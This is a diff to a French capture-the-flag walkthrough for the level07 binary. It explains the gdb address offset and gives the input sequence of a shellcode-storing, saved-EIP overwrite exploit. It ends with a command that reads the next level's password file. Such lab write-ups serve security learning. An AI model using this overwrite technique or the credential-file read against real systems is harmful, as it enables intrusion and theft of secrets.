@@ -58,6 +58,19 @@ va donc etre de stocker notre shellcode (4 bytes par 4 bytes) dans les adresse d
 Je rappel que nous ne pouvons pas ecrire a tous les index que nous souhaitons, nous allons donc parfois
 devoir jouer avec l'overflow, comme indique au debut du walkthrough.
 
+Il y a egalement un decalage memoire entre gdb et sans gdb. L'adresse de notre tableau data n'est donc pas la meme selon si on lance le binaire avec gdb ou non.
+Pour la trouver, c'est assez simple. Dans gdb, il suffit de run le binaire puis de chercher, via des index negatifs, ou se trouve l'adresse du tableau.
+En faisaint :
+
+	$ gdb level07
+	$ start
+	$ read
+	$ -9
+	
+On obtient : 0xffffd544 (en decimal). Il suffit donc de proceder pareil hors gdb pour obtenir l'adresse de notre tableau :
+
+	0xffffd564 (4294956388)
+
 J'ai choisi le shellcode suivant (23 bytes) : http://shell-storm.org/shellcode/files/shellcode-827.php
 
 Et voici notre exploit : 
@@ -81,6 +94,8 @@ Et voici notre exploit :
 		8441099		  # \x0b\xcd\x80	
 		5
 		store
-		4294956388				data[0] adresse
-		1073741938				data[114] (save eip)
+		4294956388	  # adresse de data[0] 
+		1073741938        # data[114] (save eip)
 		quit
+
+`cat /home/users/level08/.pass`
